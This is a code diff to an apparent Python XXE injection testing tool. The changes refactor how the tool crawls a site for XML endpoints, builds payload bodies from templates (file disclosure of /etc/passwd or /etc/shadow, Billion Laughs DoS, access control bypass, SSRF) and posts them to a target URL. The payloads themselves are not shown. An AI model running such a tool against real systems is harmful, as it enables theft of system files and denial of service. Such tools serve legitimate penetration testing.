@@ -86,6 +86,7 @@ def build_headers(url, custom_headers=None):
         headers.update(str_to_dict(custom_headers))
     return headers
 
+
 def build_body(argsx, template_s):
     """
     Constructs the request body by combining custom body data, XXE payloads, and selected templates.
@@ -97,6 +98,7 @@ def build_body(argsx, template_s):
     Returns:
         str: The constructed body for the request.
     """
+
     bodyg = ""
     if argsx.body:
         bodyg += argsx.body + "\n"
@@ -116,7 +118,7 @@ def build_body(argsx, template_s):
     if argsx.xxeAccessControlBypass:
         bodyg += template_s[4]
     if argsx.xxeSSRF:
-        bodyg += template_s[5]
+        bodyg += template_s[5]  
     return bodyg
 
 def perform_crawl(argsx, headers):
@@ -134,7 +136,7 @@ def perform_crawl(argsx, headers):
     """
     if argsx.url:
         print(f"Starting deep XML crawler for URL: {Fore.YELLOW} {argsx.url}{Fore.RESET}...")
-        xml_urls, all_urls = crawl(argsx.url, max_depth=20, headers=headers)
+        _, all_urls = crawl(argsx.url, max_depth=20, headers=headers)
         print("\nChecking for XML Data transfer...")
         detected_urls = [url for url in all_urls if check_xxe(url, headers=headers, body='<?xml version="1.0">')]
         return detected_urls, all_urls  # Ensure both sets are returned
@@ -149,7 +151,8 @@ def print_response(response):
     """
     print("\nRequest:\n")
     print(dict_to_str(response.request.headers) + "\n")
-    print(response.request.body if response.request.body else f"{Fore.CYAN}Body is empty!!!!{Fore.RESET}")
+    print("Body:\n")
+    print(f"{Fore.YELLOW}{response.request.body}{Fore.RESET}" if response.request.body else f"{Fore.CYAN}Body is empty!!!!{Fore.RESET}")
     print("\n\nResponse:\n")
     print(dict_to_str(response.headers) + "\n")
     print(f"Body:{Fore.GREEN}\n{response.text}{Fore.RESET}")
@@ -172,9 +175,9 @@ def show_templates(template_s, templates_h):
 def main():
 
 
-#Variable deklaration
+# Variable declaration
   
-  # variable for templates variable
+  # variable for templates
   ssrfp="https://test.com"
   url_lfi = "https://example.com?page="
   filep="/etc/passwd"
@@ -189,7 +192,7 @@ def main():
   headerg = CaseInsensitiveDict()
   bodyg = ""
 
-  # variable for crawlen
+  # variable for crawling
   headcrawx = CaseInsensitiveDict()
   headcrawx['Content-Type'] = 'application/xml'  
   
@@ -202,9 +205,6 @@ def main():
                   f"{Fore.YELLOW}XXE: Access Control Bypass{Fore.RESET}\n",
                   f"{Fore.YELLOW}XXE:SSRF{Fore.RESET}\n"
                 )
-  # variable to change the templates
-  template_s = update_templates(entityv, proto, filep, url_lfi, ssrfp)
-  
 
 #-----------------------------------------------------------------
 
@@ -231,14 +231,14 @@ def main():
   groupx = parx.add_argument_group('Special options')
 
   # Extras
-  groupx.add_argument('-cr', '--crawlex', action="store_true", help='search on the website for XML')
+  groupx.add_argument('-cr', '--crawlex', action="store_true", help='search on the website for XML interactions')
   groupx.add_argument('-crv', '--crawlexverbose', action="store_true", help='display all crawled URLs, even if no XML was found')
   groupx.add_argument('-t', '--time', action="store_true", help='give the finish time back')
 
 
   groupx = parx.add_argument_group('Templates options')
 
-  #standard templates (https://github.com/payloadbox/xxe-injection-payload-list)
+  # Standard templates (https://github.com/payloadbox/xxe-injection-payload-list)
   groupx.add_argument('-st', '--showTemplates', action="store_true", help='show all availible templates')
   groupx.add_argument('-xfd', '--xxeFileDisclosure', action="store_true", help='Use a XXE template to read a file  (default value= /etc/shadow)')
   groupx.add_argument('-xebl', '--xeeBillionLaughs', action="store_true", help='Use the Billion laughs template(DoS attack)')
@@ -258,7 +258,7 @@ def main():
   argsx = parx.parse_args()
 
 
-  # Argumente validieren
+  # Validate arguments
   try:
     validate_arguments(argsx)
   except ValueError as e:
@@ -266,29 +266,40 @@ def main():
         sys.exit(1)
 
   #------------------------------------------------------------------
+  # Update variables based on command-line arguments
+  if argsx.variableFilePath:
+        filep = argsx.variableFilePath
+  if argsx.variableEntity:
+        entityv = argsx.variableEntity
+  if argsx.variableProtocol:
+        proto = argsx.variableProtocol
+  if argsx.variableSSRF:
+        ssrfp = argsx.variableSSRF
+  if argsx.variableUrlLFI:
+        url_lfi = argsx.variableUrlLFI
 
+  # Update templates with the current variable values
+  template_s = update_templates(entityv, proto, filep, url_lfi, ssrfp)
 
-
-
-# Header und Body anpassen
+  # Adjust headers and body
   headerg = build_headers(argsx.url, argsx.headers)
   if argsx.cookie:
-        headerg.update({'Cookie': argsx.cookie})
+    headerg.update({'Cookie': argsx.cookie})
 
 
   bodyg = build_body(argsx, template_s)
 
-    # Templates anzeigen
+    # Display templates
   if argsx.showTemplates:
         show_templates(template_s, templates_h)
     
   
-  # Crawlen und XXE-Check
+  # Crawl and XXE check
   if argsx.crawlex or argsx.crawlexverbose:
       if not argsx.url:
         parx.error("The --crawlex or --crawlexverbose option requires a valid URL (-u, --url) to crawl.")
       else:
-          detected_urls, all_urls = perform_crawl(argsx, headcrawx)
+          _, all_urls = perform_crawl(argsx, headcrawx)
 
           if argsx.crawlexverbose:
             sorted_urls = sorted(all_urls)
@@ -297,12 +308,12 @@ def main():
               print(url)
             print("\n")
 
-    # Anfrage ausführen
+    # Execute request
   if argsx.url:
-        response = requests.post(argsx.url, headers=headerg, data=bodyg)
-        print_response(response)
+        req = requests.post(argsx.url, headers=headerg, data=bodyg)
+        print_response(req)
 
-    # Zeit berechnen
+    # Calculate time
   if argsx.time:
         end_t = time.time()
         real_t = end_t - start_t
@@ -310,6 +321,7 @@ def main():
         print(f"Program duration:{Fore.YELLOW} {real_t:.2f} {Fore.RESET} seconds.")
   #------------------------------------------------------
 
+  
 if __name__ == "__main__":
 
 
